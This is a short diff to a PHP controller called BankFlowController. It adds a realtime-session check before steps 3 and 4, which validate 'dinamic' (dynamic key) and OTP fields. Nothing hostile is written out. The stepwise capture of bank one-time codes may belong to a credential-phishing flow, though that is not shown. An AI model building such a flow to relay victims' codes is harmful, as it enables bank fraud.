@@ -80,6 +80,7 @@ class BankFlowController extends Controller
 
         // STEP 3/4: ejemplo para dinamic/otp (si aplica)
         if ($step === 3 || $step === 4) {
+            $this->ensureRealtimeSession($request);
             $data = $request->validate([
                 'dinamic' => 'nullable|string|min:6|max:8',
                 'otp' => 'nullable|string|min:6|max:8',
